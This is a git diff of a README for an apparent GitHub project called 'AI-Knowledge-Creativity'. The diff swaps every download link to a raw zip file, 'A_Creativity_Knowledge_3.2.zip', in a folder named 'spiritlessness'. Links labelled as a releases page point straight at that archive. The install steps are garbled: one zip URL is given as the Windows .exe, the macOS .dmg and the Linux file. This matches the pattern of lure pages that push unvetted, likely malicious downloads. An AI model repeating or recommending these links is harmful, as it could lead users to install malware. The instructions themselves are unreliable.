@@ -1,6 +1,6 @@
 # 🌍 AI-Knowledge-Creativity - Discover AI Tools for Learning and Creation
 
-[![Download AI-Knowledge-Creativity](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip)](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip)
+[![Download AI-Knowledge-Creativity](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip)](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,16 +20,16 @@ To run AI-Knowledge-Creativity, you need a computer with the following specifica
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page where you can find the downloadable files.
    
-   [Visit Releases Page to Download](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip)
 
 2. **Select the Version:** On the Releases page, you will see different versions of the software. Look for the latest version, which is usually highlighted.
 
-3. **Download the File:** Click on the file named something like `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip` for Windows, or `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip` for macOS. For Linux, you may find a `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip` file. This will download the application to your computer.
+3. **Download the File:** Click on the file named something like `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip` for Windows, or `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip` for macOS. For Linux, you may find a `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip` file. This will download the application to your computer.
 
 4. **Run the Installer:** 
    - For Windows: Double-click the `.exe` file and follow the installation prompts.
    - For macOS: Open the `.dmg` file, drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip` file and follow the included README for installation instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip` file and follow the included README for installation instructions.
 
 5. **Launch the Application:** After installation, you can find AI-Knowledge-Creativity in your applications menu. Click to launch and start exploring the tools!
 
@@ -66,4 +66,4 @@ We welcome contributions! If you want to help improve AI-Knowledge-Creativity, f
 
 Thank you for choosing AI-Knowledge-Creativity. Enjoy your journey through AI tools and unlock your creative potential!
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/AI-Knowledge-Creativity.zip)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/imsigma1/AI-Knowledge-Creativity/main/spiritlessness/A_Creativity_Knowledge_3.2.zip)
